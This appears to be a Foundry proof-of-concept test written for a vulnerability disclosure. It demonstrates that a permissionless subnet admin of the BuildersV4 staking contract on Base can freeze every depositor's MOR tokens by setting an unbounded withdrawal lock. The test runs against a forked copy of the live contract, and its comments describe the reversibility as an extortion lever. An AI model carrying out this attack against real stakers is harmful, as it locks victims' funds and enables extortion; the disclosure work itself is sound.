// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";

interface IERC20Minimal {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IBuildersV4Minimal {
    struct Subnet {
        string name;
        address admin;
        uint128 unusedStorage1_V4Update;
        uint128 withdrawLockPeriodAfterDeposit;
        uint128 unusedStorage2_V4Update;
        uint256 minimalDeposit;
        address claimAdmin;
    }

    struct SubnetMetadata {
        string slug;
        string description;
        string website;
        string image;
    }

    function createSubnet(Subnet calldata subnet_, SubnetMetadata calldata metadata_) external;
    function editSubnet(bytes32 subnetId_, Subnet calldata newSubnet_) external;
    function getSubnetId(string memory subnetName_) external view returns (bytes32);
    function deposit(bytes32 subnetId_, uint256 amount_) external;
    function withdraw(bytes32 subnetId_, uint256 amount_) external;
    function minimalWithdrawLockPeriod() external view returns (uint256);
}

/// @notice PoC for: BuildersV4.editSubnet() has no upper bound / timelock on
///         withdrawLockPeriodAfterDeposit, so a permissionless subnet admin can
///         freeze ALL stakers' funds in their subnet indefinitely.
/// @dev Target: BuildersV4 proxy 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9 on Base.
///      Fork block 58543593 (2026-11-17). No privileged accounts used anywhere:
///      the attacker is a fresh EOA that acquires the admin role via the
///      permissionless createSubnet(), and the victim is a fresh EOA.
///      Run: forge test --match-contract PocBuildersFreezeTest -vv
contract PocBuildersFreezeTest is Test {
    IBuildersV4Minimal constant BUILDERS =
        IBuildersV4Minimal(0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9);
    IERC20Minimal constant MOR =
        IERC20Minimal(0x7431aDa8a591C955a994a21710752EF9b882b8e3);

    uint256 constant FORK_BLOCK = 58543593;
    string constant BASE_RPC = "https://base-mainnet.public.blastapi.io";

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    bytes32 subnetId;
    uint256 constant DEPOSIT = 1000 ether; // 1000 MOR (~$700 at $0.70)

    function setUp() public {
        vm.createSelectFork(BASE_RPC, FORK_BLOCK);

        // Attacker creates a subnet: permissionless, gas only (creation fee is 0).
        IBuildersV4Minimal.Subnet memory s = IBuildersV4Minimal.Subnet({
            name: "PoCFreezeSubnet",
            admin: attacker,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: uint128(7 days),
            unusedStorage2_V4Update: 0,
            minimalDeposit: 0.001 ether,
            claimAdmin: attacker
        });
        IBuildersV4Minimal.SubnetMetadata memory m = IBuildersV4Minimal.SubnetMetadata({
            slug: "",
            description: "",
            website: "",
            image: ""
        });
        vm.prank(attacker);
        BUILDERS.createSubnet(s, m);
        subnetId = BUILDERS.getSubnetId("PoCFreezeSubnet");

        // Victim stakes 1000 MOR.
        deal(address(MOR), victim, DEPOSIT);
        vm.startPrank(victim);
        MOR.approve(address(BUILDERS), DEPOSIT);
        BUILDERS.deposit(subnetId, DEPOSIT);
        vm.stopPrank();
    }

    function test_withdrawWorksBeforeAttack() public {
        // Sanity: after the 7-day lock, the victim can withdraw normally.
        vm.warp(block.timestamp + 8 days);
        uint256 before = MOR.balanceOf(victim);
        vm.prank(victim);
        BUILDERS.withdraw(subnetId, 1 ether);
        assertEq(MOR.balanceOf(victim) - before, 1 ether, "withdraw should work pre-attack");
    }

    function test_adminFreezesFundsWithMaxLock() public {
        // Attacker (subnet admin) raises the lock to type(uint128).max.
        // _validateSubnet only checks lock >= minimalWithdrawLockPeriod (7 days).
        IBuildersV4Minimal.Subnet memory s = IBuildersV4Minimal.Subnet({
            name: "PoCFreezeSubnet",
            admin: attacker,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: type(uint128).max,
            unusedStorage2_V4Update: 0,
            minimalDeposit: 0.001 ether,
            claimAdmin: attacker
        });
        vm.prank(attacker);
        BUILDERS.editSubnet(subnetId, s);

        // Victim's funds are now frozen: withdraw() reverts (uint128 overflow
        // panic 0x11 in `lastDeposit + lock`) no matter how far time advances.
        vm.warp(block.timestamp + 365 days);
        uint256 victimBalBefore = MOR.balanceOf(victim);
        vm.prank(victim);
        vm.expectRevert();
        BUILDERS.withdraw(subnetId, 1 ether);
        assertEq(MOR.balanceOf(victim), victimBalBefore, "victim must not receive anything");

        // The freeze is admin-reversible: attacker lowers the lock, funds unfreeze.
        // (This reversibility is precisely the extortion lever.)
        s.withdrawLockPeriodAfterDeposit = uint128(7 days);
        vm.prank(attacker);
        BUILDERS.editSubnet(subnetId, s);
        vm.prank(victim);
        BUILDERS.withdraw(subnetId, DEPOSIT);
        assertEq(MOR.balanceOf(victim) - victimBalBefore, DEPOSIT, "funds unfreeze after admin lowers lock");
    }

    function test_adminFreezesFundsWith100YearLock() public {
        // Time-freeze variant: a 100-year lock (fits in uint128, no overflow).
        IBuildersV4Minimal.Subnet memory s = IBuildersV4Minimal.Subnet({
            name: "PoCFreezeSubnet",
            admin: attacker,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: uint128(100 * 365 days),
            unusedStorage2_V4Update: 0,
            minimalDeposit: 0.001 ether,
            claimAdmin: attacker
        });
        vm.prank(attacker);
        BUILDERS.editSubnet(subnetId, s);

        // Even 10 years later the victim still cannot withdraw.
        vm.warp(block.timestamp + 10 * 365 days);
        vm.prank(victim);
        vm.expectRevert("BU: user withdraw is locked");
        BUILDERS.withdraw(subnetId, 1 ether);

        // Only after the full 100 years does withdraw work again.
        vm.warp(block.timestamp + 91 * 365 days);
        uint256 before = MOR.balanceOf(victim);
        vm.prank(victim);
        BUILDERS.withdraw(subnetId, DEPOSIT);
        assertEq(MOR.balanceOf(victim) - before, DEPOSIT, "withdraw works only after 100y lock expires");
    }
}
